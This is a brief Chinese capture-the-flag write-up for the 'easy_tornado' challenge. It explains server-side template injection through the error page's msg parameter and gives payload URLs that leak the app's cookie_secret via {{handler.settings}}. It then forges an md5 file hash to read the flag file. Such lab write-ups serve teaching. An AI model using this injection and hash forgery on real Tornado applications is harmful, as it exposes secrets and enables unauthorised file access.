# [护网杯 2018]easy_tornado

##  知识点

- 模板注入

- ```html
  error?msg
  ```

error文件的msg参数

- handler.settings

  handler  指向RequestHandler，而RequestHandler.settings又指向self.application.settings，所以handler.settings就指向RequestHandler.application.settings了，这里面就是我们的一些环境变量

## 步骤

payload1：`http://cb8ac99d-e3b1-4a28-88ce-28139f685746.node3.buuoj.cn/error?msg={{handler.settings}}`

得到`cookie_secret`

构造md5(cookie_secret+md5(filename))

最终payload：`http://cb8ac99d-e3b1-4a28-88ce-28139f685746.node3.buuoj.cn/file?filename=/fllllllllllllag&filehash=16830e7502fe5580fe43766d53145cf2`